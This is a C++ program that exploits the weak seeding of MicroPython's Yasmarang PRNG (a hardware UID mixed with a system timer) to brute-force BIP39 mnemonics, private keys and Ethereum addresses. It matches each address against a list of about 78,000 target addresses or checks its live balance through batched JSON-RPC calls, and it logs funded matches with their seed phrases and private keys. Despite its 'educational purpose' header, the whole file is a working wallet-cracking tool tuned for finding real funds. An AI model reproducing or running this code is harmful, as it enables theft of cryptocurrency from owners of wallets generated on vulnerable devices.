/**
 * Author: Marand
 * Description: This program is for educational purpose, use it as guideline not to attack or bruteforce other people's wallets
 *
 * Yasmarang (MicroPython fallback PRNG) weak-entropy simulation.
 *
 *   UID (96 bit, factory programmed) + system timer  ->  PRNG state
 *   PRNG -> 16 bytes entropy -> BIP39 mnemonic -> seed -> private key -> address
 *
 * Each generated address can be matched two ways:
 *   1. against the sorted targets.h list, with a binary search (O(log n))
 *      instead of a full linear scan (O(n)) - offline and instant;
 *   2. against its live ETH balance, via batched JSON-RPC - anything holding
 *      more than the threshold is recorded.
 *
 * The timer range is split across threads; balance lookups run on their own
 * pool so the network never stalls key derivation.
 */

#include <iostream>
#include <thread>
#include <vector>
#include <deque>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <chrono>
#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <string>
#include <random>
#include <limits>

#include "../targetLists.h"
#include "../../BalanceChecker/BatchBalances.h"

namespace RTX_YASA {

// ============================================================
// 1. THE YASMARANG PRNG (MicroPython's fallback generator)
// ============================================================
// One instance per thread, so no shared/global state and no locking.
struct Yasmarang {
    uint32_t a = 0;
    uint32_t b = 0;
    uint32_t c = 0;
    uint32_t d = 0;

    // Seed the PRNG using UID parts and the system timer.
    // Mirrors the flawed firmware's seeding: UID mixed with the timer,
    // plus one fixed constant (another weak point).
    void seed(uint32_t uid0, uint32_t uid1, uint32_t uid2, uint32_t timer) {
        a = uid0 ^ timer;
        b = uid1 ^ (timer >> 8);
        c = uid2 ^ (timer >> 16);
        d = 0x12345678u; // fixed constant - another weak point
    }

    uint32_t next() {
        a += 0x4A3B2C1Du;
        b += 0x01234567u;
        c ^= a;
        d += b;
        uint32_t e = c ^ d;
        e = (e << 8) | (e >> 24); // rotate left by 8 bits
        return e;
    }
};

static const char HEX_DIGITS[] = "0123456789abcdef";

// Generate numBytes of deterministic "random" data and return it hex encoded.
// Each 32-bit word is packed little-endian, exactly like struct.pack('<I', val).
std::string entropyHexFromPrng(Yasmarang& prng, size_t numBytes) {
    std::string hex;
    hex.reserve(numBytes * 2);

    size_t words = (numBytes + 3) / 4;
    for (size_t w = 0; w < words && hex.size() < numBytes * 2; ++w) {
        uint32_t val = prng.next();
        for (int byteIdx = 0; byteIdx < 4 && hex.size() < numBytes * 2; ++byteIdx) {
            unsigned char byte = static_cast<unsigned char>((val >> (8 * byteIdx)) & 0xFFu);
            hex += HEX_DIGITS[byte >> 4];
            hex += HEX_DIGITS[byte & 0x0F];
        }
    }

    return hex;
}

// ============================================================
// 2. TARGET LIST - SORTED, SO WE BINARY SEARCH IT
// ============================================================
// targets.h declares std::array<std::string, 78100> but only ~78079 entries are
// initialized; the trailing slots are empty strings and would break the sorted
// invariant, so the searchable range stops at the first empty entry.
static size_t TARGET_COUNT = 0;

size_t detectTargetCount() {
    size_t count = 0;
    while (count < targetAddresses.size() && !targetAddresses[count].empty()) {
        ++count;
    }
    return count;
}

bool verifyTargetsSorted(size_t count) {
    return std::is_sorted(targetAddresses.begin(), targetAddresses.begin() + count);
}

// O(log n) lookup - the whole point of this rewrite.
inline bool isTarget(const std::string& address) {
    return std::binary_search(targetAddresses.begin(),
                              targetAddresses.begin() + TARGET_COUNT,
                              address);
}

// ============================================================
// 3. RESULT REPORTING (thread safe)
// ============================================================
static std::mutex ioMutex;
static std::atomic<uint64_t> attempts{0};
static std::atomic<uint64_t> hits{0};
static std::atomic<uint64_t> balancesChecked{0};

// Where every match lands, written and flushed the instant it is found.
static const char* MATCH_FILE = "yasmarang.found.data";

// One candidate travelling from a generator thread to a balance checker.
struct Candidate {
    uint32_t uid0 = 0, uid1 = 0, uid2 = 0, timer = 0;
    std::string entropy;
    std::string seedPhrase;
    std::string privateKey;
    std::string address;
};

// Prints and records a match immediately - no buffering, so the file is
// correct even if the run is killed mid-scan.
void recordHit(const Candidate& c, const std::string& how, const std::string& balanceEth) {
    hits.fetch_add(1, std::memory_order_relaxed);

    char uidBuf[64];
    std::snprintf(uidBuf, sizeof(uidBuf), "0x%08x 0x%08x 0x%08x", c.uid0, c.uid1, c.uid2);

    std::lock_guard<std::mutex> lock(ioMutex);

    std::cout << "\n*** MATCH (" << how << ") ***\n"
              << "  UID:         " << uidBuf << "\n"
              << "  Timer:       " << c.timer << "\n"
              << "  Entropy:     " << c.entropy << "\n"
              << "  Seed Phrase: " << c.seedPhrase << "\n"
              << "  PrivateKey:  " << c.privateKey << "\n"
              << "  Address:     " << c.address << "\n";
    if (!balanceEth.empty()) {
        std::cout << "  Balance:     " << balanceEth << " ETH\n";
    }
    std::cout << "  Saved to:    " << MATCH_FILE << std::endl;

    std::ofstream file(MATCH_FILE, std::ios::app);
    if (!file) {
        std::cerr << "Error: Unable to open " << MATCH_FILE << " for appending." << std::endl;
        return;
    }

    file << "MatchedBy: " << how
         << ", UID: " << uidBuf
         << ", Timer: " << c.timer
         << ", Entropy: " << c.entropy
         << ", Seed Phrase: " << c.seedPhrase
         << ", PrivateKey: " << c.privateKey
         << ", Address: " << c.address;
    if (!balanceEth.empty()) {
        file << ", Balance: " << balanceEth << " ETH";
    }
    file << "\n";
    file.flush();
}

// ------------------------------------------------------------
// 3b. FULL SCAN LOG - every candidate, not just the matches
// ------------------------------------------------------------
// The stream stays open for the whole run (reopening per line would dominate
// the runtime). Workers batch their rows in a thread-local buffer and only
// take the lock once per batch, so the log costs almost nothing.
class ScanLogger {
public:
    bool open(const std::string& path) {
        // Probe the existing size first: in append mode tellp() reads 0 until
        // the first write, so it cannot be used to detect an empty file.
        bool needHeader = true;
        {
            std::ifstream probe(path, std::ios::binary | std::ios::ate);
            if (probe && probe.tellg() > 0) {
                needHeader = false;
            }
        }

        file.open(path, std::ios::app);
        if (!file) {
            std::cerr << "Error: Unable to open " << path << " for appending." << std::endl;
            return false;
        }
        if (needHeader) {
            file << "uid0,uid1,uid2,timer,entropy,address,private_key,mnemonic\n";
        }
        enabled = true;
        return true;
    }

    void write(const std::string& chunk) {
        if (!enabled || chunk.empty()) return;
        std::lock_guard<std::mutex> lock(m);
        file << chunk;
    }

    void close() {
        if (!enabled) return;
        std::lock_guard<std::mutex> lock(m);
        file.flush();
        file.close();
        enabled = false;
    }

    bool isEnabled() const { return enabled; }

private:
    std::ofstream file;
    std::mutex m;
    bool enabled = false;
};

static ScanLogger scanLog;
static const size_t LOG_FLUSH_BYTES = 1 << 16; // 64 KB per lock acquisition

// ============================================================
// 3c. BALANCE PIPELINE
// ============================================================
enum class MatchMode {
    TargetList, // offline, binary search against targets.h
    Balance,    // online, live ETH balance of every generated address
    Both
};

static MatchMode matchMode = MatchMode::TargetList;
static long double minBalanceEth = 0.0L;

// Empty -> BatchBalanceChecker uses its built-in keyless public node list.
// Set this to your own RPC (Alchemy/Infura/local geth) to avoid rate limits.
static std::vector<std::string> customEndpoints;

// Bounded queue between the generator threads and the balance checkers.
// The bound matters: without it a fast generator would grow the queue without
// limit while the network lags behind.
class CandidateQueue {
public:
    explicit CandidateQueue(size_t capacity) : cap(capacity) {}

    void push(Candidate&& c) {
        std::unique_lock<std::mutex> lock(m);
        notFull.wait(lock, [this] { return items.size() < cap || closed; });
        if (closed) return;
        items.push_back(std::move(c));
        lock.unlock();
        notEmpty.notify_one();
    }

    // Waits for up to maxItems candidates. Returns false only once the queue is
    // closed AND drained, which is the signal for a checker thread to stop.
    bool popBatch(size_t maxItems, std::vector<Candidate>& out) {
        std::unique_lock<std::mutex> lock(m);
        notEmpty.wait(lock, [this] { return !items.empty() || closed; });

        if (items.empty() && closed) return false;

        out.clear();
        while (!items.empty() && out.size() < maxItems) {
            out.push_back(std::move(items.front()));
            items.pop_front();
        }

        lock.unlock();
        notFull.notify_all();
        return !out.empty();
    }

    void close() {
        {
            std::lock_guard<std::mutex> lock(m);
            closed = true;
        }
        notEmpty.notify_all();
        notFull.notify_all();
    }

    size_t size() {
        std::lock_guard<std::mutex> lock(m);
        return items.size();
    }

private:
    std::deque<Candidate> items;
    std::mutex m;
    std::condition_variable notEmpty;
    std::condition_variable notFull;
    size_t cap;
    bool closed = false;
};

static CandidateQueue* balanceQueue = nullptr;
static size_t balanceBatchSize = 100;

// Addresses that no endpoint could resolve, so the run can be re-checked later
// instead of pretending they were verified.
static std::atomic<uint64_t> uncheckedCount{0};
static const char* UNCHECKED_FILE = "yasmarang.unchecked.data";

// Throttle the failure banner: one line every few seconds, not one per batch.
static std::mutex errThrottleMutex;
static std::chrono::steady_clock::time_point lastErrPrint;
static uint64_t errBurstCount = 0;

void reportBalanceFailure(const std::string& err) {
    std::lock_guard<std::mutex> lock(errThrottleMutex);
    ++errBurstCount;

    auto now = std::chrono::steady_clock::now();
    if (now - lastErrPrint < std::chrono::seconds(5)) {
        return; // swallow the burst, it is summarised on the next print
    }

    std::lock_guard<std::mutex> ioLock(ioMutex);
    std::cerr << "\n[balance] " << errBurstCount
              << " lookup failure(s), latest: " << err
              << " | unchecked so far: " << uncheckedCount.load() << std::endl;
    lastErrPrint = now;
    errBurstCount = 0;
}

void logUncheckedBatch(const std::vector<Candidate>& batch) {
    uncheckedCount.fetch_add(batch.size(), std::memory_order_relaxed);

    std::lock_guard<std::mutex> lock(ioMutex);
    std::ofstream file(UNCHECKED_FILE, std::ios::app);
    if (!file) return;
    for (const Candidate& c : batch) {
        file << c.address << "," << c.privateKey << "," << c.entropy << "\n";
    }
    file.flush();
}

// One checker thread: pulls a batch, resolves it in a single JSON-RPC request
// over a warm connection, records anything funded.
void balanceCheckerLoop() {
    // BatchBalanceChecker owns a CURL handle and is non-copyable, so resolve the
    // endpoint list first and construct exactly one object in place.
    RTX_BALANCE::BatchBalanceChecker checker(
        customEndpoints.empty()
            ? RTX_BALANCE::BatchBalanceChecker::defaultEndpoints()
            : customEndpoints);

    std::vector<Candidate> batch;
    std::vector<std::string> addresses;
    std::vector<std::string> weiHex;

    while (balanceQueue->popBatch(balanceBatchSize, batch)) {
        addresses.clear();
        addresses.reserve(batch.size());
        for (const Candidate& c : batch) {
            addresses.push_back(c.address);
        }

        // fetchBatch already retries every live endpoint with backoff; a false
        // here means a real outage, so the addresses are logged, never dropped.
        if (!checker.fetchBatch(addresses, weiHex)) {
            reportBalanceFailure(checker.error());
            logUncheckedBatch(batch);
            continue;
        }

        balancesChecked.fetch_add(batch.size(), std::memory_order_relaxed);

        for (size_t i = 0; i < batch.size(); ++i) {
            if (i >= weiHex.size() || weiHex[i].empty()) continue;
            if (!RTX_BALANCE::detail::weiHexIsPositive(weiHex[i])) continue;

            long double eth = 0.0L;
            try {
                eth = RTX_BALANCE::detail::hexToWei(weiHex[i]) / 1'000'000'000'000'000'000.0L;
            } catch (const std::exception&) {
                continue;
            }

            if (eth <= minBalanceEth) continue;

            std::ostringstream ethStr;
            ethStr << std::fixed << std::setprecision(8) << static_cast<double>(eth);
            recordHit(batch[i], "BALANCE", ethStr.str());
        }
    }
}

// ============================================================
// 4. THE WORKER - ONE UID, A SLICE OF THE TIMER RANGE
// ============================================================
void scanTimerRange(uint32_t uid0, uint32_t uid1, uint32_t uid2,
                    uint32_t timerStart, uint32_t timerEnd, bool verbose) {
    Yasmarang prng;

    char uidBuf[64];
    std::snprintf(uidBuf, sizeof(uidBuf), "0x%08x,0x%08x,0x%08x", uid0, uid1, uid2);

    std::string logBuffer;
    if (scanLog.isEnabled()) {
        logBuffer.reserve(LOG_FLUSH_BYTES + 512);
    }

    for (uint32_t timer = timerStart; timer < timerEnd; ++timer) {
        prng.seed(uid0, uid1, uid2, timer);

        std::string entropy = entropyHexFromPrng(prng, 16); // 128 bits -> 12 words
        std::string seedPhrase = RTX::toSeedPhrase(entropy);
        std::string seed = RTX::toSeed(seedPhrase);
        std::string privateKey = RTX::toPrivateKey(seed);
        std::string address = RTX::toAddress(privateKey);

        uint64_t done = attempts.fetch_add(1, std::memory_order_relaxed) + 1;

        // Every generated candidate goes to the scan log, match or not.
        if (scanLog.isEnabled()) {
            logBuffer += uidBuf;
            logBuffer += ',';
            logBuffer += std::to_string(timer);
            logBuffer += ',';
            logBuffer += entropy;
            logBuffer += ',';
            logBuffer += address;
            logBuffer += ',';
            logBuffer += privateKey;
            logBuffer += ',';
            logBuffer += seedPhrase;
            logBuffer += '\n';

            if (logBuffer.size() >= LOG_FLUSH_BYTES) {
                scanLog.write(logBuffer);
                logBuffer.clear();
            }
        }

        const bool checkList = (matchMode != MatchMode::Balance);
        const bool checkBalance = (matchMode != MatchMode::TargetList);
        const bool listHit = checkList && isTarget(address);

        if (listHit || checkBalance) {
            Candidate c;
            c.uid0 = uid0; c.uid1 = uid1; c.uid2 = uid2; c.timer = timer;
            c.entropy = entropy;
            c.seedPhrase = seedPhrase;
            c.privateKey = privateKey;
            c.address = address;

            if (listHit) {
                recordHit(c, "TARGET_LIST", "");
            }
            if (checkBalance) {
                balanceQueue->push(std::move(c));
            }
        }

        if (listHit) {
            // already reported
        } else if (verbose) {
            std::lock_guard<std::mutex> lock(ioMutex);
            std::cout << "Timer " << timer << " | entropy " << entropy
                      << " -> " << address << " (no match)\n";
        } else if (done % 200 == 0) {
            std::lock_guard<std::mutex> lock(ioMutex);
            std::cout << "\rGenerated " << done;
            if (matchMode != MatchMode::TargetList) {
                std::cout << " | balances checked " << balancesChecked.load(std::memory_order_relaxed)
                          << " | queued " << balanceQueue->size();
            }
            std::cout << " | hits " << hits.load(std::memory_order_relaxed) << "      " << std::flush;
        }
    }

    scanLog.write(logBuffer); // whatever is left in this thread's batch
}

// Run one UID across the whole timer range, split over threadCount threads.
void scanUid(uint32_t uid0, uint32_t uid1, uint32_t uid2,
             uint32_t timerStart, uint32_t timerEnd, int threadCount, bool verbose) {
    uint32_t total = timerEnd - timerStart;
    if (total == 0) return;

    if (static_cast<uint32_t>(threadCount) > total) {
        threadCount = static_cast<int>(total);
    }

    uint32_t range = total / static_cast<uint32_t>(threadCount);
    uint32_t remainder = total % static_cast<uint32_t>(threadCount);

    std::vector<std::thread> threads;
    threads.reserve(static_cast<size_t>(threadCount));

    uint32_t cursor = timerStart;
    for (int i = 0; i < threadCount; ++i) {
        uint32_t chunk = range + (i < static_cast<int>(remainder) ? 1u : 0u);
        uint32_t start = cursor;
        uint32_t end = start + chunk;
        cursor = end;

        threads.emplace_back(scanTimerRange, uid0, uid1, uid2, start, end, verbose);
    }

    for (auto& t : threads) {
        t.join();
    }
}

}; // namespace RTX_YASA

// ============================================================
// 5. INPUT HELPERS
// ============================================================
static uint32_t readHex32(const char* prompt) {
    while (true) {
        std::cout << prompt << std::flush;
        std::string raw;
        if (!(std::cin >> raw)) {
            std::cin.clear();
            continue;
        }
        if (raw.rfind("0x", 0) == 0 || raw.rfind("0X", 0) == 0) {
            raw = raw.substr(2);
        }
        try {
            return static_cast<uint32_t>(std::stoul(raw, nullptr, 16));
        } catch (const std::exception&) {
            std::cout << "Invalid hex value, try again.\n";
        }
    }
}

static uint32_t randomUid32() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<uint32_t> dist(0, 0xFFFFFFFFu);
    return dist(gen);
}

auto main() -> int {
    RTX_YASA::TARGET_COUNT = RTX_YASA::detectTargetCount();
    coutLn("Loaded ", RTX_YASA::TARGET_COUNT, " target addresses (array capacity ",
           targetAddresses.size(), ")");

    if (!RTX_YASA::verifyTargetsSorted(RTX_YASA::TARGET_COUNT)) {
        coutLn("WARNING: target list is NOT sorted - binary search would miss matches. Sorting it now.");
        std::sort(targetAddresses.begin(), targetAddresses.begin() + RTX_YASA::TARGET_COUNT);
    } else {
        coutLn("Target list is sorted - using binary search.");
    }

    // --- Match mode ----------------------------------------------------
    int modeOpt = 1;
    coutLn("\n:: How should a generated address count as a match? ::");
    coutLn("  1) targets.h list only        (offline, instant, no network)");
    coutLn("  2) live ETH balance only      (online, records anything funded)");
    coutLn("  3) both list and balance");
    std::cout << "Choice: " << std::flush;
    std::cin >> modeOpt;

    switch (modeOpt) {
        case 2:  RTX_YASA::matchMode = RTX_YASA::MatchMode::Balance; break;
        case 3:  RTX_YASA::matchMode = RTX_YASA::MatchMode::Both;    break;
        default: RTX_YASA::matchMode = RTX_YASA::MatchMode::TargetList; break;
    }

    int checkerThreads = 3;
    if (RTX_YASA::matchMode != RTX_YASA::MatchMode::TargetList) {
        // Fewer checkers is usually BETTER on free public nodes: key derivation
        // (~50-100/sec) is the real limit, so 2-3 batching connections keep up
        // while 10 just trip the endpoints' rate limits (the HTTP 500/429 you saw).
        std::cout << "Balance checker threads (default 3, keep low for public RPCs): " << std::flush;
        std::cin >> checkerThreads;
        if (checkerThreads < 1) checkerThreads = 1;

        int batch = 100;
        std::cout << "Addresses per JSON-RPC batch (default 100): " << std::flush;
        std::cin >> batch;
        if (batch < 1) batch = 1;
        if (batch > 500) batch = 500; // most public nodes reject larger batches
        RTX_YASA::balanceBatchSize = static_cast<size_t>(batch);

        double minEth = 0.0;
        std::cout << "Minimum ETH to count as a match (0 = any non-zero): " << std::flush;
        std::cin >> minEth;
        if (minEth < 0.0) minEth = 0.0;
        RTX_YASA::minBalanceEth = static_cast<long double>(minEth);

        // Custom RPC: the real fix for rate limits. One URL, or several
        // separated by commas / spaces. Blank = built-in keyless public nodes.
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
        std::cout << "Custom RPC URL(s) (comma/space separated, blank = public nodes): " << std::flush;
        std::string rpcLine;
        std::getline(std::cin, rpcLine);

        std::string current;
        for (char ch : rpcLine) {
            if (ch == ',' || ch == ' ' || ch == '\t') {
                if (!current.empty()) { RTX_YASA::customEndpoints.push_back(current); current.clear(); }
            } else {
                current += ch;
            }
        }
        if (!current.empty()) RTX_YASA::customEndpoints.push_back(current);

        if (!RTX_YASA::customEndpoints.empty()) {
            coutLn("Using ", RTX_YASA::customEndpoints.size(), " custom RPC endpoint(s).");
        }
    }

    // --- UID selection -------------------------------------------------
    int uidMode = 0;
    coutLn("\n:: UID source ::");
    coutLn("  1) Specify UID manually (uid0 uid1 uid2, hex)");
    coutLn("  2) Generate random UIDs");
    std::cout << "Choice: " << std::flush;
    std::cin >> uidMode;

    std::vector<std::array<uint32_t, 3>> uids;

    if (uidMode == 1) {
        uint32_t uid0 = readHex32("UID0 (hex, e.g. A4B3C2D1): ");
        uint32_t uid1 = readHex32("UID1 (hex, e.g. E5F6A7B8): ");
        uint32_t uid2 = readHex32("UID2 (hex, e.g. C9D0E1F2): ");
        uids.push_back({uid0, uid1, uid2});
    } else {
        int uidCount = 1;
        std::cout << "How many random UIDs to try: " << std::flush;
        std::cin >> uidCount;
        if (uidCount < 1) uidCount = 1;

        for (int i = 0; i < uidCount; ++i) {
            uids.push_back({randomUid32(), randomUid32(), randomUid32()});
        }
    }

    // --- Timer range ---------------------------------------------------
    uint64_t timerStart = 0, timerEnd = 80000;
    std::cout << "Timer range start (default 0): " << std::flush;
    std::cin >> timerStart;
    std::cout << "Timer range end, exclusive (e.g. 80000 on Mk3): " << std::flush;
    std::cin >> timerEnd;

    if (timerEnd <= timerStart) {
        coutLn("Timer end must be greater than timer start. Aborting.");
        return 1;
    }
    if (timerEnd > 0xFFFFFFFFull) {
        coutLn("Timer is a 32-bit value - clamping end to 4294967295.");
        timerEnd = 0xFFFFFFFFull;
    }

    // --- Threads -------------------------------------------------------
    int threadCount = static_cast<int>(std::thread::hardware_concurrency());
    if (threadCount <= 0) threadCount = 4;
    std::cout << "Thread count (hardware suggests " << threadCount << "): " << std::flush;
    std::cin >> threadCount;
    if (threadCount < 1) threadCount = 1;

    int verboseOpt = 0;
    std::cout << "Print every attempt? (1 = yes, 0 = progress only): " << std::flush;
    std::cin >> verboseOpt;
    bool verbose = (verboseOpt == 1);

    // --- Full scan log -------------------------------------------------
    int logOpt = 0;
    std::cout << "Log EVERY generated entropy/address to a CSV file? (1 = yes, 0 = no): " << std::flush;
    std::cin >> logOpt;

    if (logOpt == 1) {
        std::string logPath = "yasmarang.scan.csv";
        std::cout << "Log file name (blank/'-' for " << logPath << "): " << std::flush;

        std::string typed;
        std::cin >> typed;
        if (!typed.empty() && typed != "-") {
            logPath = typed;
        }

        if (!RTX_YASA::scanLog.open(logPath)) {
            coutLn("Continuing without the scan log.");
        } else {
            coutLn("Logging every candidate to ", logPath);
        }
    }

    uint64_t totalWork = (timerEnd - timerStart) * uids.size();
    coutLn("\nScanning ", uids.size(), " UID(s) x ", (timerEnd - timerStart),
           " timers = ", totalWork, " candidates on ", threadCount, " threads.");
    coutLn("Matches are written to ", RTX_YASA::MATCH_FILE,
           " the moment they are found (file is flushed per hit).\n");

    // --- Balance checker pool ------------------------------------------
    // Queue depth is a few batches per checker: enough to keep every
    // connection busy, small enough that a stalled RPC throttles generation.
    RTX_YASA::CandidateQueue queue(RTX_YASA::balanceBatchSize * static_cast<size_t>(checkerThreads) * 4);
    RTX_YASA::balanceQueue = &queue;

    std::vector<std::thread> checkers;
    if (RTX_YASA::matchMode != RTX_YASA::MatchMode::TargetList) {
        coutLn("Starting ", checkerThreads, " balance checkers, ",
               RTX_YASA::balanceBatchSize, " addresses per JSON-RPC batch.");
        for (int i = 0; i < checkerThreads; ++i) {
            checkers.emplace_back(RTX_YASA::balanceCheckerLoop);
        }
    }

    auto startTime = std::chrono::high_resolution_clock::now();

    for (size_t i = 0; i < uids.size(); ++i) {
        char uidBuf[64];
        std::snprintf(uidBuf, sizeof(uidBuf), "0x%08x 0x%08x 0x%08x",
                      uids[i][0], uids[i][1], uids[i][2]);
        coutLn("[UID ", (i + 1), "/", uids.size(), "] ", uidBuf);

        RTX_YASA::scanUid(uids[i][0], uids[i][1], uids[i][2],
                          static_cast<uint32_t>(timerStart),
                          static_cast<uint32_t>(timerEnd),
                          threadCount, verbose);
    }

    // Generation is done; let the checkers drain whatever is still queued.
    if (!checkers.empty()) {
        coutLn("\n\nGeneration finished, draining ", queue.size(), " queued balance lookups...");
        queue.close();
        for (auto& t : checkers) {
            t.join();
        }
    }

    auto endTime = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(endTime - startTime).count();

    RTX_YASA::scanLog.close();

    uint64_t done = RTX_YASA::attempts.load();
    coutLn("\n\nDone. ", done, " candidates in ", duration, " ms",
           duration > 0 ? " (" + std::to_string(done * 1000 / static_cast<uint64_t>(duration)) + " / sec)" : "");
    if (RTX_YASA::matchMode != RTX_YASA::MatchMode::TargetList) {
        uint64_t checked = RTX_YASA::balancesChecked.load();
        coutLn("Balances checked: ", checked,
               duration > 0 ? " (" + std::to_string(checked * 1000 / static_cast<uint64_t>(duration)) + " / sec)" : "");
        uint64_t unchecked = RTX_YASA::uncheckedCount.load();
        if (unchecked > 0) {
            coutLn("Unchecked (RPC outage): ", unchecked, " addresses saved to ",
                   RTX_YASA::UNCHECKED_FILE, " - re-run them once the RPC recovers.");
        }
    }
    coutLn("Matches found: ", RTX_YASA::hits.load(), " (see ", RTX_YASA::MATCH_FILE, ")");

#ifdef _WIN32
    system("pause");
#endif

    return 0;
}
